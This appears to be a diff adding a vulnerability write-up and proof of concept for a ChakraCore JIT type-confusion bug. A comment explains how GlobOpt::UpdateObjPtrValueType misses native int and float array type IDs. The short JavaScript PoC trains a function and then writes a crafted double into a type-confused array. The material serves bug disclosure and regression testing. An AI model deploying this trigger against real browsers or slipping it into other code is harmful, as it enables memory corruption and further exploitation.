@@ -1,0 +1,79 @@
+/*
+The switch statement only handles Js::TypeIds_Array but not Js::TypeIds_NativeIntArray and Js::TypeIds_NativeFloatArray. So for example, a native float array can be considered as of type ObjectType::Object under certain circumstances where "objValueType.IsLikelyArrayOrObjectWithArray()" is not fulfilled. As it doesn't install any array type conversion check for a definite object, handling a native array as a definite object can lead to type confusion.
+
+void
+GlobOpt::UpdateObjPtrValueType(IR::Opnd * opnd, IR::Instr * instr)
+{
+    ...
+    if (newValueType == ValueType::Uninitialized)
+    {
+        switch (typeId)
+        {
+        default:
+            if (typeId > Js::TypeIds_LastStaticType)
+            {
+                Assert(typeId != Js::TypeIds_Proxy);
+                if (objValueType.IsLikelyArrayOrObjectWithArray())
+                {
+                    // If we have likely object with array before, we can't make it definite object with array
+                    // since we have only proved that it is an object.
+                    // Keep the likely array or object with array.
+                }
+                else
+                {
+                    newValueType = ValueType::GetObject(ObjectType::Object);
+                }
+            }
+            break;
+        case Js::TypeIds_Array:
+            // Because array can change type id, we can only make it definite if we are doing array check hoist
+            // so that implicit call will be installed between the array checks.
+            if (!DoArrayCheckHoist() ||
+                (currentBlock->loop
+                ? !this->ImplicitCallFlagsAllowOpts(currentBlock->loop)
+                : !this->ImplicitCallFlagsAllowOpts(this->func)))
+            {
+                break;
+            }
+            if (objValueType.IsLikelyArrayOrObjectWithArray())
+            {
+                // If we have likely no missing values before, keep the likely, because, we haven't proven that
+                // the array really has no missing values
+                if (!objValueType.HasNoMissingValues())
+                {
+                    newValueType = ValueType::GetObject(ObjectType::Array).SetArrayTypeId(typeId);
+                }
+            }
+            else
+            {
+                newValueType = ValueType::GetObject(ObjectType::Array).SetArrayTypeId(typeId);
+            }
+            break;
+        }
+    }
+    ...
+}
+
+PoC:
+*/
+
+function opt(arr, arr2) {
+    arr[0] = 1.1;
+
+    arr2.method(arr2[0] = {});
+
+    arr[0] = 2.3023e-320;
+}
+
+Object.prototype.method = () => {};
+
+let arr = [1.1, 2.2];
+for (let i = 0; i < 100; i++) {
+    opt(arr, 1);  // Feeding an integer to make the value type LikelyCanBeTaggedValue_Int_PrimitiveOrObject
+    opt(arr, arr.concat());
+}
+
+setTimeout(() => {
+    opt(arr, arr);
+    alert(arr);
+}, 100);  // Waiting for the JIT server to finish its job.
